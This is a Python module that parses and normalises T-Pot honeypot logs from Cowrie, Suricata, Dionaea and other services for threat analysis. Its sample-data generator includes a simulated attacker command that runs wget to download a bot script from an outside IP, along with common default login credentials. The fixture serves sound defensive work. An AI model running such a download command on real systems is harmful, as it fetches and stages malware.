"""
core/parser.py

Parses T-Pot honeypot JSON logs from multiple honeypot services:
  - Cowrie      (SSH/Telnet brute-force & command capture)
  - Dionaea     (malware capture: SMB, FTP, HTTP, MSSQL)
  - Suricata    (IDS/IPS network alerts)
  - Honeytrap   (generic TCP/UDP trap)
  - Glutton     (multi-protocol honeypot)

T-Pot stores logs as newline-delimited JSON (.json or .log) files, often
rotated daily with timestamps in the filename.

Log locations inside T-Pot:
  /data/cowrie/log/cowrie.json*
  /data/dionaea/log/dionaea.json*
  /data/suricata/log/eve.json*
  /data/honeytrap/log/

Logstash may also output enriched versions to /data/elk/logstash/
"""

import json
import logging
import os
import glob
from datetime import datetime
from pathlib import Path
from typing import Tuple

logger = logging.getLogger("tpot_pipeline.parser")


# Maps T-Pot honeypot service names to their log file glob patterns
# Tuned for T-Pot CE installed at /home/ubuntu/tpotce/data/
HONEYPOT_LOG_PATTERNS = {
    "cowrie":     ["cowrie/log/cowrie.json"],
    "dionaea":    ["dionaea/log/dionaea.json"],
    "suricata":   ["suricata/log/eve.json"],
    "honeytrap":  ["honeytrap/log/attackers.json"],
    "heralding":  ["heralding/log/log_session.json"],
    "tanner":     ["tanner/log/tanner_report.json"],
    "conpot":     ["conpot/log/conpot_IEC104.json",
                   "conpot/log/conpot_guardian_ast.json",
                   "conpot/log/conpot_kamstrup_382.json"],
    "h0neytr4p":  ["h0neytr4p/log/log.json"],
    "miniprint":  ["miniprint/log/miniprint.json"],
    "adbhoney":   ["adbhoney/log/adbhoney.json"],
    "p0f":        ["p0f/log/p0f.json"],
}


class TpotLogParser:
    """
    Walks a T-Pot log directory, parses JSON events from each honeypot,
    normalises them into a common schema, and stores them in the DB.
    """

    def __init__(self, log_dir: str, db):
        self.log_dir = Path(log_dir)
        self.db = db

    def run(self) -> Tuple[int, int]:
        """
        Main entry point. Returns (total_events_parsed, unique_ips_found).
        """
        if not self.log_dir.exists():
            logger.warning("Log directory not found: %s", self.log_dir)
            logger.info("Creating sample log directory for testing...")
            self._create_sample_logs()

        total_events = 0
        unique_ips = set()
        seen_files = set()  # prevent double-parsing the same file

        for service, patterns in HONEYPOT_LOG_PATTERNS.items():
            for pattern in patterns:
                filepath = self.log_dir / pattern
                if filepath in seen_files:
                    continue
                if filepath.is_file() and filepath.stat().st_size > 0:
                    seen_files.add(filepath)
                    events, ips = self._parse_file(filepath, service)
                    total_events += events
                    unique_ips.update(ips)
                else:
                    logger.debug("Not found or empty: %s", filepath)

        return total_events, len(unique_ips)

    def _parse_file(self, filepath: Path, service_hint: str) -> Tuple[int, list]:
        """
        Parse a single log file. Returns (event_count, list_of_source_ips).
        Handles newline-delimited JSON (NDJSON) format.
        """
        count = 0
        ips = []
        logger.debug("Parsing: %s", filepath)

        try:
            with open(filepath, "r", encoding="utf-8", errors="replace") as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        raw = json.loads(line)
                    except json.JSONDecodeError:
                        logger.debug("  Skip line %d (invalid JSON): %s...", line_num, line[:60])
                        continue

                    event = self._normalise_event(raw, service_hint, str(filepath))
                    if event and event.get("src_ip"):
                        self.db.insert_event(event)
                        ips.append(event["src_ip"])
                        count += 1

        except (OSError, IOError) as e:
            logger.error("Could not read %s: %s", filepath, e)

        if count:
            logger.debug("  %s -> %d events", filepath.name, count)
        return count, ips

    def _normalise_event(self, raw: dict, service_hint: str, source_file: str) -> dict:
        """
        Normalise a raw JSON event from any honeypot into a common schema.

        Common schema fields:
          src_ip, src_port, dst_port, protocol, service,
          timestamp, event_type, username, password,
          command, url, filename, sha256, raw_json
        """
        # Detect service from log content if possible
        service = self._detect_service(raw, service_hint)

        # Route to service-specific normaliser
        normalise_fn = {
            "cowrie":    self._normalise_cowrie,
            "dionaea":   self._normalise_dionaea,
            "suricata":  self._normalise_suricata,
            "honeytrap": self._normalise_honeytrap,
            "heralding": self._normalise_heralding,
            "tanner":    self._normalise_tanner,
            "conpot":    self._normalise_conpot,
            "p0f":       self._normalise_p0f,
        }.get(service, self._normalise_generic)

        event = normalise_fn(raw)
        if event:
            event["service"] = service
            event["source_file"] = source_file
            event["raw_json"] = json.dumps(raw)
            # Validate IP
            if not self._is_valid_ip(event.get("src_ip", "")):
                return None
        return event

    def _detect_service(self, raw: dict, hint: str) -> str:
        """Detect which honeypot service generated this log entry."""
        # Cowrie uses eventid field like "cowrie.session.connect"
        if "eventid" in raw and raw.get("eventid", "").startswith("cowrie."):
            return "cowrie"
        # Suricata uses event_type field
        if "event_type" in raw and "alert" in raw.get("event_type", ""):
            return "suricata"
        # Dionaea has specific fields
        if "connection" in raw and "origin" in raw:
            return "dionaea"
        # Honeytrap
        if "attack" in raw and "service" in raw:
            return "honeytrap"
        # Fall back to filename hint
        return hint if hint in ("cowrie", "dionaea", "suricata", "honeytrap") else "unknown"

    # ------------------------------------------------------------------
    # Service-specific normalisers
    # ------------------------------------------------------------------

    def _normalise_cowrie(self, raw: dict) -> dict:
        """
        Cowrie SSH/Telnet honeypot.
        Key event types: session.connect, login.failed, login.success,
                         command.input, session.file_download
        """
        event_id = raw.get("eventid", "")
        return {
            "src_ip":      raw.get("src_ip") or raw.get("peerIP"),
            "src_port":    raw.get("src_port"),
            "dst_port":    raw.get("dst_port", 22),
            "protocol":    "ssh" if "ssh" in event_id else "telnet",
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  event_id.replace("cowrie.", ""),
            "username":    raw.get("username"),
            "password":    raw.get("password"),
            "command":     raw.get("input"),           # commands typed by attacker
            "url":         raw.get("url"),             # download URL
            "filename":    raw.get("outfile"),         # file downloaded
            "sha256":      raw.get("shasum"),
            "session":     raw.get("session"),
        }

    def _normalise_dionaea(self, raw: dict) -> dict:
        """
        Dionaea multi-protocol malware honeypot.
        Captures: SMB exploits, FTP uploads, HTTP requests, malware binaries.
        """
        conn = raw.get("connection", {})
        return {
            "src_ip":      conn.get("remote_host") or raw.get("src_ip"),
            "src_port":    conn.get("remote_port"),
            "dst_port":    conn.get("local_port"),
            "protocol":    conn.get("transport", "tcp"),
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  raw.get("origin", "connection"),
            "url":         raw.get("url"),
            "filename":    raw.get("filename"),
            "sha256":      raw.get("sha512") or raw.get("md5"),   # dionaea logs sha512
        }

    def _normalise_suricata(self, raw: dict) -> dict:
        """
        Suricata IDS/IPS.
        Real T-Pot field names: dest_port (not dst_port), nested flow object.
        Handles both alert and non-alert event types.
        """
        alert = raw.get("alert", {})
        event_type = raw.get("event_type", "event")
        return {
            "src_ip":      raw.get("src_ip"),
            "src_port":    raw.get("src_port"),
            "dst_port":    raw.get("dest_port"),          # T-Pot uses dest_port
            "protocol":    raw.get("proto", "").lower(),
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  event_type,
            "alert_sig":   alert.get("signature"),
            "alert_cat":   alert.get("category"),
            "severity":    alert.get("severity"),
            "sid":         alert.get("signature_id"),
        }

    def _normalise_honeytrap(self, raw: dict) -> dict:
        """
        Honeytrap attackers.json format.
        Real T-Pot fields: remote_host, remote_port, local_port, protocol.
        """
        return {
            "src_ip":      raw.get("remote_host") or raw.get("src_ip"),
            "src_port":    raw.get("remote_port"),
            "dst_port":    raw.get("local_port"),
            "protocol":    raw.get("transport") or raw.get("protocol", "tcp"),
            "timestamp":   self._parse_timestamp(raw.get("timestamp") or raw.get("time")),
            "event_type":  "connection",
            "url":         raw.get("url"),
        }

    def _normalise_heralding(self, raw: dict) -> dict:
        """
        Heralding credential honeypot (FTP, HTTP, IMAP, POP3, SMTP, SSH, Telnet, VNC).
        Captures credentials across many protocols.
        """
        return {
            "src_ip":      raw.get("source_ip") or raw.get("src_ip"),
            "src_port":    raw.get("source_port"),
            "dst_port":    raw.get("destination_port"),
            "protocol":    raw.get("protocol", "unknown").lower(),
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  "credential_attempt",
            "username":    raw.get("username"),
            "password":    raw.get("password"),
        }

    def _normalise_tanner(self, raw: dict) -> dict:
        """
        Tanner web application honeypot (pairs with SNARE).
        Captures HTTP attacks: SQLi, XSS, path traversal, RFI etc.
        """
        sess = raw.get("response", {}) if "response" in raw else raw
        return {
            "src_ip":      raw.get("peer", {}).get("ip") or raw.get("src_ip"),
            "src_port":    raw.get("peer", {}).get("port"),
            "dst_port":    80,
            "protocol":    "http",
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  raw.get("attack_types", ["http_request"])[0] if raw.get("attack_types") else "http_request",
            "url":         raw.get("path") or raw.get("url"),
        }

    def _normalise_conpot(self, raw: dict) -> dict:
        """
        Conpot ICS/SCADA honeypot (Modbus, IEC104, DNP3, BACnet, IPMI).
        Targets industrial control systems.
        """
        return {
            "src_ip":      raw.get("remote") or raw.get("src_ip"),
            "dst_port":    raw.get("port"),
            "protocol":    raw.get("data_type") or raw.get("protocol", "ics"),
            "timestamp":   self._parse_timestamp(raw.get("timestamp")),
            "event_type":  "ics_probe",
        }

    def _normalise_p0f(self, raw: dict) -> dict:
        """
        p0f passive OS fingerprinting.
        Doesn't capture attacks but enriches IPs with OS/browser fingerprints.
        """
        return {
            "src_ip":      raw.get("src") or raw.get("src_ip"),
            "src_port":    raw.get("sport"),
            "dst_port":    raw.get("dport"),
            "protocol":    "tcp",
            "timestamp":   self._parse_timestamp(raw.get("date")),
            "event_type":  "os_fingerprint",
            "command":     raw.get("os"),   # reuse command field for OS string
        }

    def _normalise_generic(self, raw: dict) -> dict:
        """
        Best-effort normaliser for unknown or logstash-enriched events.
        Tries common field names used across ECS / T-Pot.
        """
        src_ip = (
            raw.get("src_ip") or
            raw.get("source", {}).get("ip") or
            raw.get("remote_ip") or
            raw.get("ip")
        )
        return {
            "src_ip":   src_ip,
            "src_port": raw.get("src_port") or raw.get("source", {}).get("port"),
            "dst_port": raw.get("dest_port") or raw.get("dst_port") or raw.get("destination", {}).get("port"),
            "protocol": raw.get("proto") or raw.get("protocol") or raw.get("transport", "unknown"),
            "timestamp": self._parse_timestamp(raw.get("timestamp") or raw.get("@timestamp")),
            "event_type": raw.get("type") or raw.get("event_type") or "event",
            "username": raw.get("username"),
            "password": raw.get("password"),
        }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_timestamp(ts) -> str:
        """Normalise various timestamp formats to ISO8601 string."""
        if not ts:
            return datetime.utcnow().isoformat()
        if isinstance(ts, (int, float)):
            return datetime.utcfromtimestamp(ts).isoformat()
        if isinstance(ts, str):
            # Already ISO-ish
            return ts[:26]  # Trim microseconds/tz for SQLite storage
        return datetime.utcnow().isoformat()

    @staticmethod
    def _is_valid_ip(ip: str) -> bool:
        """Basic IP validation - reject empty, private, and loopback."""
        if not ip or not isinstance(ip, str):
            return False
        parts = ip.strip().split(".")
        if len(parts) != 4:
            return False
        try:
            octets = [int(p) for p in parts]
        except ValueError:
            return False
        # Skip private/loopback ranges
        if octets[0] == 127:
            return False
        if octets[0] == 10:
            return False
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            return False
        if octets[0] == 192 and octets[1] == 168:
            return False
        return all(0 <= o <= 255 for o in octets)

    def _create_sample_logs(self):
        """
        Generate sample T-Pot logs for testing when real logs aren't available.
        Simulates realistic Cowrie, Dionaea, and Suricata events.
        """
        self.log_dir.mkdir(parents=True, exist_ok=True)
        sample_dir = self.log_dir / "cowrie" / "log"
        sample_dir.mkdir(parents=True, exist_ok=True)

        cowrie_events = [
            {"eventid": "cowrie.session.connect",  "src_ip": "45.83.65.12",  "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:44.123456", "session": "abc123"},
            {"eventid": "cowrie.login.failed",      "src_ip": "45.83.65.12",  "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:45.234567", "username": "root",   "password": "123456",   "session": "abc123"},
            {"eventid": "cowrie.login.failed",      "src_ip": "45.83.65.12",  "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:46.345678", "username": "admin",  "password": "admin",    "session": "abc123"},
            {"eventid": "cowrie.login.success",     "src_ip": "45.83.65.12",  "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:47.456789", "username": "root",   "password": "password", "session": "abc123"},
            {"eventid": "cowrie.command.input",     "src_ip": "45.83.65.12",  "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:50.567890", "input": "wget http://94.102.49.55/bot.sh", "session": "abc123"},
            {"eventid": "cowrie.session.file_download", "src_ip": "45.83.65.12", "src_port": 52341, "dst_port": 22, "timestamp": "2024-01-15T02:13:55.678901", "url": "http://94.102.49.55/bot.sh", "outfile": "/tmp/bot.sh", "shasum": "e3b0c44298fc1c149afb", "session": "abc123"},
            {"eventid": "cowrie.session.connect",   "src_ip": "185.220.101.47","src_port": 49821, "dst_port": 22, "timestamp": "2024-01-15T03:22:01.123456", "session": "def456"},
            {"eventid": "cowrie.login.failed",      "src_ip": "185.220.101.47","src_port": 49821, "dst_port": 22, "timestamp": "2024-01-15T03:22:02.234567", "username": "pi",    "password": "raspberry","session": "def456"},
            {"eventid": "cowrie.session.connect",   "src_ip": "91.92.248.1",  "src_port": 33901, "dst_port": 23, "timestamp": "2024-01-15T04:01:11.111111", "session": "ghi789"},
            {"eventid": "cowrie.login.failed",      "src_ip": "91.92.248.1",  "src_port": 33901, "dst_port": 23, "timestamp": "2024-01-15T04:01:12.222222", "username": "admin",  "password": "1234",     "session": "ghi789"},
        ]

        suricata_dir = self.log_dir / "suricata" / "log"
        suricata_dir.mkdir(parents=True, exist_ok=True)
        suricata_events = [
            {"event_type": "alert", "src_ip": "141.98.10.120", "src_port": 4444, "dest_port": 8080, "proto": "TCP", "timestamp": "2024-01-15T05:10:00.000000",
             "alert": {"signature": "ET SCAN Nmap Scripting Engine User-Agent", "category": "Attempted Information Leak", "severity": 2, "signature_id": 2009582}},
            {"event_type": "alert", "src_ip": "45.155.204.15", "src_port": 6588, "dest_port": 80,   "proto": "TCP", "timestamp": "2024-01-15T06:30:00.000000",
             "alert": {"signature": "ET EXPLOIT EternalBlue SMB MS17-010 Probe", "category": "Attempted Administrator Privilege Gain", "severity": 1, "signature_id": 2024218}},
        ]

        # Write sample logs
        with open(sample_dir / "cowrie.json", "w") as f:
            for e in cowrie_events:
                f.write(json.dumps(e) + "\n")

        with open(suricata_dir / "eve.json", "w") as f:
            for e in suricata_events:
                f.write(json.dumps(e) + "\n")

        logger.info("Sample logs created in: %s", self.log_dir)
